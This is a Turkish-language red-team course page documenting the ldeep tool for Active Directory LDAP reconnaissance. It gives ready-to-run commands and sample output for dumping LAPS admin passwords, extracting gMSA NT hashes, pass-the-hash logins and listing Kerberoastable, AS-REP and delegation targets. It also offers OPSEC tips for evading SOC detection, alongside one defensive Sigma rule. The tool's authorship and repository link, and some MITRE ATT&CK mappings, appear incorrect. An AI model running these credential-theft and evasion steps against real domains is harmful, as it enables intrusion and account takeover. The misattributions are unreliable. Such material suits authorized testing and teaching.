# ldeep

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** François-Xavier Darve (@ShutdownRepo) tarafından geliştirilen; Active Directory LDAP ortamlarında derinlemesine öznitelik çözümlemesi, LAPS parolaları, gMSA hash'leri, AD CS PKI yapılandırmaları ve Kerberos delegasyonlarını cerrahi hassasiyetle sorgulayan gelişmiş Python aracı.

---

## 1. Genel Bakış ve Amaç

**ldeep**, sızma testi uzmanları ve kırmızı takım operatörleri için tasarlanmış, hedefli ve cerrahi (surgical) Active Directory keşif aracıdır. ldapdomaindump gibi araçlar tüm etki alanı veritabanını körlemesine yerel diske indirmeye odaklanırken; `ldeep`, operatörün ihtiyaç duyduğu kritik bilgileri (örneğin yalnızca LAPS yönetici parolaları, gMSA hesapları, kısıtlı delegasyonlar veya PKI sertifika şablonları) **nokta atışı LDAP filtreleriyle** dakikalar içinde çekmesini sağlar.

Araç, saf Python 3 ve **ldap3** kütüphanesi üzerine kurulmuştur. Açık metin parola, NTLM hash (Pass-the-Hash) ve Kerberos biletleri (`.ccache`) ile tam uyumludur. ldeep'in en güçlü özelliklerinden biri, ham LDAP ikili (binary) verilerini (örneğin gMSA hesaplarının `msDS-ManagedPassword` blob'unu veya Güvenlik Tanımlayıcılarının SID/GUID yapılarını) otomatik olarak insan okunabilir NT hash'lerine ve güvenlik haklarına dönüştürebilmesidir.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                               LDEEP ÇALIŞMA MİMARİSİ                              |
+-----------------------------------------------------------------------------------+
                                          |
                      [Operatör / Kali Linux / Sızma Testçisi]
                       ldeep ldap -u user -p pass -d domain <komut>
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                        Kimlik Doğrulama ve Bağlantı                               |
|  - Açık Metin Parola (-p)                                                         |
|  - Pass-the-Hash (-H LM:NT)                                                       |
|  - Kerberos Bileti (-k --no-pass / KRB5CCNAME)                                    |
|  - Protokol Seçimi: LDAP (TCP 389) veya LDAPS (TCP 636)                            |
+-----------------------------------------------------------------------------------+
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                           ldeep Özel Analiz Modülleri                             |
+-----------------------------------------------------------------------------------+
  |-- laps         : ms-Mcs-AdmPwd (Açık metin yerel admin parolaları)
  |-- gmsa         : msDS-ManagedPassword (NTLM hash çözümleme)
  |-- delegations  : Unconstrained, Constrained (S4U) ve RBCD delegasyonları
  |-- pki          : AD CS Sertifika Otoriteleri ve Şablon analizleri
  |-- users        : SPN (Kerberoast), AS-REP, AdminCount, Parola bayatlığı
  |-- computers    : İşletim sistemleri, DC'ler, IP adresleri
  |-- groups       : İç içe (nested) üyelikler, yetkili gruplar
  |-- pso          : Fine-Grained Password Policies (Şifre Eşikleri)
  |-- zones        : ADIDNS bölgeleri ve DNS kayıtları
                                          |
                                          v
+-----------------------------------------------------------------------------------+
|                           Biçimlendirilmiş Çıktılar                               |
|        - Renkli ve Hizalı Terminal Tabloları (Varsayılan)                         |
|        - Otomasyon için Yapılandırılmış JSON (--json)                             |
+-----------------------------------------------------------------------------------+
```

### Neden Önemli?

| Yetenek | Operasyonel Değer | Sızma Testi Avantajı |
|---|---|---|
| **LAPS Parola Okuma** | `ms-Mcs-AdmPwd` özniteliğini sorgulayarak yerel admin parolalarını döker. | Düşük yetkili hesapla iş istasyonlarında anında Local Administrator olma. |
| **gMSA Hash Çözümleme** | `msDS-ManagedPassword` blob'unu çözümleyerek servis NTLM hash'ini çıkarır. | Grup Yönetilen Servis Hesaplarını doğrudan ele geçirme (Privilege Escalation). |
| **Hedefli ve Cerrahi Keşif** | Yalnızca istenen nesneleri çeker, tüm dizini indirmez. | SIEM ve SOC alarmlarını tetiklemeden sessizce kritik zafiyetleri tespit etme. |
| **PKI ve AD CS Keşfi** | Sertifika Otoritelerini ve şablonları ek araç kurmadan LDAP'tan döker. | ESC1-ESC8 saldırı vektörleri için zemin hazırlar. |

### Alternatif Araçlarla Karşılaştırma

| Kriter | ldeep | ldapdomaindump | pywerview | NetExec (nxc ldap) | ldapsearch |
|---|---|---|---|---|---|
| **Sorgu Yaklaşımı** | **Hedefli / Modüler** | Toptan Dizin İndirme | PowerView Cmdlet'leri | Modül / Bayrak Odaklı | Ham LDAP Sözdizimi |
| **gMSA Çözümleme** | **Var (Dahili)** | Yok | Yok | Kısmi | Yok (Ham Binary) |
| **LAPS Çözümleme** | **Var (Dahili)** | Var (grep içinde) | Kısmi | Var | Var (Okuma İzni Varsa)|
| **Ağ Gürültüsü** | **Çok Düşük** | Orta | Orta | Orta | Çok Düşük |
| **JSON Çıktısı** | Tam Destekli | Var | Var | Kısmi | Yok |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

ldeep komut satırında ana protokol (`ldap`), bağlantı bayrakları ve ardından çalıştırılacak **eylem modülü (action)** ile çağrılır:

```bash
ldeep ldap -u [kullanıcı] -p [parola] -d [etki_alanı] -s [dc_adresi] [eylem] [seçenekler]
```

### 2.1 Bağlantı ve Kimlik Doğrulama Parametreleri

| Parametre | Kısa Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| `--username` | `-u` | Kimlik doğrulamada kullanılacak kullanıcı adı. | `-u "ahmet"` |
| `--password` | `-p` | İlgili kullanıcının açık metin parolası. | `-p "Parola123!"` |
| `--hashes` | `-H` | NTLM kimlik doğrulama hash'i (`LM:NT` veya `:NT`). | `-H ":e19ccf75ee..."` |
| `--domain` | `-d` | Hedef Active Directory etki alanı adı. | `-d "corp.local"` |
| `--server` | `-s` | Hedef Etki Alanı Denetleyicisi IP adresi veya FQDN'i. | `-s "10.10.10.10"` |
| `--kerberos` | `-k` | NTLM yerine Kerberos kimlik doğrulaması kullanma. | *(Anahtar bayrak)* |
| `--no-pass` | | Parola girmeden `KRB5CCNAME` ortam değişkenindeki bileti kullanır. | *(Anahtar bayrak)* |
| `--ssl` | | LDAP yerine şifreli LDAPS (TCP 636) protokolünü zorlar. | *(Anahtar bayrak)* |

### 2.2 Ana Eylem Modülleri (Actions)

| Eylem (Action) | Açıklama |
|---|---|
| `users` | Kullanıcı hesaplarını listeler (`--spn`, `--asreproast`, `--admincount`). |
| `computers` | Etki alanındaki bilgisayarları, sunucuları ve DC'leri listeler. |
| `groups` | Güvenlik gruplarını ve grup üyelerini dökümler. |
| `laps` | LAPS parolalarını (`ms-Mcs-AdmPwd`) ve süre bitim tarihlerini listeler. |
| `gmsa` | gMSA hesaplarının `msDS-ManagedPassword` blob'unu çözerek NT hash'ini çıkarır. |
| `delegations` | Kerberos Unconstrained, Constrained (S4U) ve RBCD delegasyonlarını döker. |
| `pki` | Sertifika Otoritelerini (CA) ve sertifika şablonlarını listeler. |
| `pso` | Fine-Grained Password Policies (PSO) kurallarını döker. |
| `trusts` | Etki alanı güven ilişkilerini ve yönlerini listeler. |
| `all` | Desteklenen tüm modülleri sırayla çalıştırır. |

### 2.3 Filtreleme ve Çıktı Seçenekleri

| Parametre | Açıklama |
|---|---|
| `--json` | Sonuçları terminal tablosu yerine JSON formatında üretir. |
| `-o`, `--output` | Çıktıyı yerel bir dosyaya kaydeder. |
| `--spn` | Yalnızca `servicePrincipalName` kaydı olan hesapları filtreler. |
| `--asreproast` | Yalnızca ön kimlik doğrulaması kapatılmış hesapları getirir. |
| `--admincount` | Yalnızca `adminCount=1` olan korumalı nesneleri listeler. |
| `--unconstrained` | Kısıtlamasız delegasyonlu sistemleri filtreler. |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: LAPS Yönetici Parolalarını LDAP Üzerinden Açık Metin Çekme

Mevcut kullanıcının okuma yetkisi olan etki alanı bilgisayarlarının yerel Administrator parolalarını dökme:

```bash
ldeep ldap -u ahmet -p 'Parola123!' -d corp.local -s 10.10.10.10 laps
```

**Konsol Çıktısı Analizi:**

```text
[*] Connected to ldap://10.10.10.10:389 - Simple Bind OK
[*] Querying LAPS passwords (ms-Mcs-AdmPwd)...
+---------------------+-------------------------+---------------------+
| Computer Name       | LAPS Password           | Expiration Date     |
+---------------------+-------------------------+---------------------+
| PC-FINANS-01$       | jK9#mP2$vL5!qR8*        | 2026-11-04 10:22:15 |
| PC-YONETIM-03$      | wX4@tY7&uI1%oP9^        | 2026-10-28 14:05:00 |
| SRV-BACKUP-01$      | B@ckup_Adm!n_2026       | 2026-12-01 08:30:10 |
+---------------------+-------------------------+---------------------+
[*] 3 LAPS passwords successfully retrieved!
```
*Analiz: Operatör hiçbir zararlı yazılım çalıştırmadan, yalnızca LDAP okuma hakkıyla `SRV-BACKUP-01$` sunucusunun yerel Administrator açık metin parolasını elde etmiştir. Bu parola ile SMB veya WMI üzerinden sunucuya doğrudan bağlanılabilir.*

### Senaryo 2: gMSA (Group Managed Service Account) Parola Hash'lerini Çözme

Etki alanında gMSA hesabı okuma yetkisi olan bir kullanıcı ile servis hesabının NTLM hash'ini hesaplama:

```bash
ldeep ldap -u ahmet -p 'Parola123!' -d corp.local -s 10.10.10.10 gmsa
```

**Konsol Çıktısı Analizi:**

```text
[*] Querying gMSA accounts (objectClass=msDS-GroupManagedServiceAccount)...
[+] Found gMSA: svc_web_gmsa$
[+] msDS-ManagedPassword blob retrieved (CurrentPasswordID: 4)
[+] Calculated NT Hash: 9b2d398f6d2e81a34b2f1092837465ab
[*] Credentials: corp.local\svc_web_gmsa$:aad3b435b51404eeaad3b435b51404ee:9b2d398f6d2e81a34b2f1092837465ab
```
*Analiz: `msDS-ManagedPassword` yapısı ldeep tarafından çözülmüş ve hesaba ait geçerli NT hash'i üretilmiştir. Bu hash ile Pass-the-Hash yapılarak servisin erişim sağladığı kaynaklara sızılabilir.*

### Senaryo 3: Pass-the-Hash ile Kerberoastable SPN ve AS-REP Hesaplarını Çekme

Açık metin parola olmadan, ele geçirilen NTLM hash ile çevrimdışı kırılabilecek kullanıcıları filtreleme:

```bash
ldeep ldap -u mehmet -H ':8846f7eaee8fb117ad06bdd830b7586c' -d corp.local -s 10.10.10.10 users --spn
```

### Senaryo 4: PKI ve Sertifika Otoritelerini (AD CS) İnceleme

Etki alanındaki Sertifika Otoritelerini, şablonları ve zafiyetli yapılandırmaları listeleme:

```bash
ldeep ldap -u ahmet -p 'Parola123!' -d corp.local -s 10.10.10.10 pki
```

### Senaryo 5: Kerberos Delegasyonlarını (Unconstrained / Constrained) Listeleme

Bilet sahteciliği ve zorlamalı kimlik doğrulama için uygun delegasyon tanımlı bilgisayarları ve servisleri döker:

```bash
ldeep ldap -u ahmet -p 'Parola123!' -d corp.local -s 10.10.10.10 delegations
```

### Senaryo 6: JSON Çıktısı Alıp jq ile Filtreleme

Grup üyeliklerini JSON formatında dışa aktarıp `Domain Admins` grubu üyelerini terminalde filtreleme:

```bash
ldeep ldap -u ahmet -p 'Parola123!' -d corp.local -s 10.10.10.10 groups --json | jq -r '.[] | select(.sAMAccountName == "Domain Admins") | .members[]'
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `KeyError: 'ms-Mcs-AdmPwd'` veya LAPS boş dönüyor | Kullanılan kullanıcının bilgisayar nesneleri üzerinde `All Extended Rights` veya LAPS okuma izni yok. | Yalnızca okuma yetkisi olan OU'ları hedefleyin veya helpdesk/teknisyen hesapları ele geçirildiğinde bu modülü tekrar çalıştırın. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | `-k` (Kerberos) kullanıldığında `-s` parametresine IP adresi girildi. | Kerberos biletleri IP kabul etmez; `-s` parametresine mutlaka DC'nin tam FQDN adını (`dc01.corp.local`) verin ve DNS çözümlemesini doğrulayın. |
| `gMSA DecryptionError: unable to decrypt msDS-ManagedPassword` | gMSA blob'unun çözülmesi için gerekli `cryptography` veya `pycryptodome` kütüphanesi eksik ya da sürümü eski. | `pip install --upgrade pycryptodome cryptography` komutu ile kriptografik bağımlılıkları güncelleyin. |
| `LDAPBindError: invalidCredentials` | Kullanıcı adı, parola veya NTLM hash hatalı girildi. | Paroladaki özel karakterleri tek tırnak içine alın. NTLM hash kullanırken başında `:NT` formatı olmasına dikkat edin. |
| `SSL: CERTIFICATE_VERIFY_FAILED on --ssl` | DC'nin kendinden imzalı SSL sertifikası Python doğrulamasından geçemedi. | LDAPS yerine port 389 standart LDAP kullanın veya DC'nin kök sertifikasını yerel CA havuzuna ekleyin. |
| `Ldeep command not found` | ldeep Python sanal ortamı (venv) dışında kuruldu veya PATH yolunda değil. | `pipx install ldeep` veya `python3 -m ldeep ...` şeklinde doğrudan modül olarak çağırın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

ldeep, **yalnızca talep edilen nesneleri sorgulayan dar kapsamlı LDAP filtreleri kullandığı için** etki alanı keşif araçları arasında en yüksek OPSEC profiline sahip olanlardan biridir.

### 5.1 Bırakılan İzler ve Log Kaynakları

1. **Windows Security Event ID 4624 (Logon Type 3):**
   - DC üzerinde istemci makinesinden gelen LDAP/S ağ oturumu kaydı.
2. **Directory Service Access (Event ID 4662):**
   - LAPS parolası okunduğunda (`ms-Mcs-AdmPwd` GUID: `863f64ec-1e4d-4408-a96e-52643a7a9226`) veya gMSA parolası istendiğinde DC üzerinde denetim kaydı oluşur.
3. **Event ID 4768 / 4769:**
   - Kerberos bileti (`-k`) ile kimlik doğrulandığında oluşan bilet talep logları.

### 5.2 Ağ ve EDR İmzaları

- **Hedefli LDAP Sorguları:** `(objectClass=msDS-GroupManagedServiceAccount)` veya `(ms-Mcs-AdmPwd=*)` gibi spesifik LDAP filtreleri SOC analistleri tarafından yazılmış özel tespit kurallarına takılabilir.
- **Düz Metin Trafik:** Eğer `--ssl` kullanılmazsa LAPS parolaları port 389 üzerinden ağa açık metin olarak akar.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | ldeep Karşılığı |
|---|---|---|
| **T1555** | Credentials from Password Stores: LAPS | `laps` modülü ile yerel yönetici parolası çalma |
| **T1087.002** | Account Discovery: Domain Account | `users`, `users --spn`, `users --asreproast` |
| **T1069.002** | Permission Groups Discovery: Domain Groups | `groups` modülü |
| **T1018** | Remote System Discovery | `computers` modülü |
| **T1484.001** | Domain Policy Modification: Group Policy Modification | `delegations` modülü |
| **T1649** | Steal or Forge Authentication Certificates | `pki` modülü ile AD CS keşfi |

### 5.4 OPSEC Önerileri

| Risk | Tespit Sebebi | OPSEC Önlemi |
|---|---|---|
| **Açık Metin LAPS Parolası** | Port 389 üzerinde ağ sniffer'larının LAPS parolasını yakalaması. | LAPS ve gMSA sorguları yaparken **istisnasız** `--ssl` bayrağını kullanarak LDAPS şifrelemesi sağlayın. |
| **4662 Hassas Öznitelik Logu**| `ms-Mcs-AdmPwd` özniteliğinin SIEM tarafından izlenmesi. | Tüm makinelerin LAPS parolasını tek seferde çekmeyin; yalnızca hedeflediğiniz tekil bilgisayarı sorgulayın. |
| **NTLM Trafiği** | NTLM kimlik doğrulamasının ağda yakalanması. | `-k --no-pass` ile mevcut Kerberos biletlerini kullanarak NTLM kullanımından kaçının. |

### 5.5 Savunma Karşılığı (Blue Team & Detection)

LAPS parolası ve gMSA özniteliklerinin okunmasını tespit eden örnek Sigma / Windows Event ID 4662 kuralı:

```yaml
title: LAPS Password Read Access via LDAP
id: c9281a04-laps-read-detection
status: experimental
description: Detects unauthorized read operations on the ms-Mcs-AdmPwd attribute using Event ID 4662.
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4662
        Properties|contains: '{863f64ec-1e4d-4408-a96e-52643a7a9226}'  # ms-Mcs-AdmPwd Attribute GUID
    condition: selection
level: high
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. LAPS Parolalarını Şifreli LDAPS ile Çekme
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 --ssl laps
```
- **Ne Yapar?** LAPS korumalı makinelerin yerel yönetici parolalarını TLS şifreli olarak listeler.
- **Ne Zaman Kullanılır?** Düşük yetkili hesapla iş istasyonlarında yerel admin yetkisi elde etmek için.
- **Parametreler:** `--ssl` port 636 LDAPS tüneli; `laps` hedef modül.

```bash
# 2. gMSA Servis Hesaplarının Parola Hash'lerini Çözme
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 gmsa
```
- **Ne Yapar?** Grup Yönetilen Servis Hesaplarının `msDS-ManagedPassword` alanını çözüp NTLM hash'ini üretir.
- **Ne Zaman Kullanılır?** Servis hesaplarına sızarak ayrıcalık yükseltme aşamasında.
- **Parametreler:** `gmsa` modülü ikili blob çözümlemesini otomatik yapar.

```bash
# 3. Pass-the-Hash ile Kerberoastable SPN Hesaplarını Listeleme
ldeep ldap -u user -H ':nt_hash' -d corp.local -s 10.10.10.10 users --spn
```
- **Ne Yapar?** Parola gerekmeden NTLM hash ile SPN tanımlı kullanıcıları döker.
- **Ne Zaman Kullanılır?** Çevrimdışı parola kırma saldırısı için hedef servis hesaplarını saptarken.
- **Parametreler:** `-H` NTLM hash; `--spn` filtre anahtarı.

```bash
# 4. Kerberos Delegasyonlarını (Unconstrained / Constrained) Çıkarma
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 delegations
```
- **Ne Yapar?** TGT saklayan veya S4U yetkisi olan delegasyonlu bilgisayar ve servisleri listeler.
- **Ne Zaman Kullanılır?** PetitPotam veya Kerberos bilet sahteciliği saldırıları kurgularken.
- **Parametreler:** `delegations` modülü tüm delegasyon türlerini analiz eder.

```bash
# 5. AS-REP Roasting Açık Hesapları Filtreleme
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 users --asreproast
```
- **Ne Yapar?** Kerberos ön kimlik doğrulaması kapatılmış kullanıcıları listeler.
- **Ne Zaman Kullanılır?** Parolasız bilet özeti talep etmek için zafiyetli kullanıcı ararken.
- **Parametreler:** `--asreproast` ilgili UAC bayrağını sorgular.

```bash
# 6. AD CS Sertifika Otoritelerini (PKI) Listeleme
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 pki
```
- **Ne Yapar?** Etki alanındaki Sertifika Otoritelerini, şablonları ve yayınlanan sertifikaları listeler.
- **Ne Zaman Kullanılır?** AD CS ESC1-ESC8 saldırı vektörlerini doğrulamak için.
- **Parametreler:** `pki` modülü PKI kapsayıcısını sorgular.

```bash
# 7. Fine-Grained Password Policies (PSO) Kurallarını Çekme
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 pso
```
- **Ne Yapar?** Belirli kullanıcılara veya gruplara atanmış özel parola politikalarını döker.
- **Ne Zaman Kullanılır?** Parola püskürtme öncesi hesap kilitleme eşiklerini incelemek için.
- **Parametreler:** `pso` Password Settings Object nesnelerini çeker.

```bash
# 8. Kerberos Bileti (ccache) ile Parolasız Çalıştırma
ldeep ldap -k --no-pass -d corp.local -s dc01.corp.local users --admincount
```
- **Ne Yapar?** NTLM trafiği oluşturmadan mevcut Kerberos oturumuyla `adminCount=1` olan yetkili hesapları listeler.
- **Ne Zaman Kullanılır?** Ağda NTLM trafiği engellendiğinde veya izlendiğinde.
- **Parametreler:** `-k` Kerberos modu; `--no-pass` bilet kullan; `-s` FQDN adresi.

```bash
# 9. JSON Formatında Otomasyon Çıktısı Alma
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 computers --json -o computers.json
```
- **Ne Yapar?** Bilgisayar listesini diğer analiz araçları ve script'ler için JSON olarak kaydeder.
- **Ne Zaman Kullanılır?** Keşif verilerini otomatik raporlama veya envanter araçlarına beslerken.
- **Parametreler:** `--json` JSON modu; `-o` çıktı dosyası.

```bash
# 10. Etki Alanı Güven İlişkilerini (Trusts) Haritalama
ldeep ldap -u user -p pass -d corp.local -s 10.10.10.10 trusts
```
- **Ne Yapar?** Etki alanının bağlı olduğu tüm güven sınırlarını, güven yönlerini ve türlerini listeler.
- **Ne Zaman Kullanılır?** Ormanlar arası yatay hareket ve orman köküne geçiş fırsatlarını ararken.
- **Parametreler:** `trusts` modülü güven nesnelerini sorgular.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [ShutdownRepo / ldeep](https://github.com/ShutdownRepo/ldeep)
- **ShutdownRepo Güvenlik Dokümantasyonu:** [Shutdown's Active Directory Notes](https://notes.shutdown.rest/)
- **LAPS Protokol Analizi:** [Microsoft LAPS Architecture](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- **MITRE ATT&CK Framework:** [Technique T1555 - Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)

---

> **Önceki:** [← ldapdomaindump](./ldapdomaindump.md) · **Sonraki:** [adalanche →](./adalanche.md)
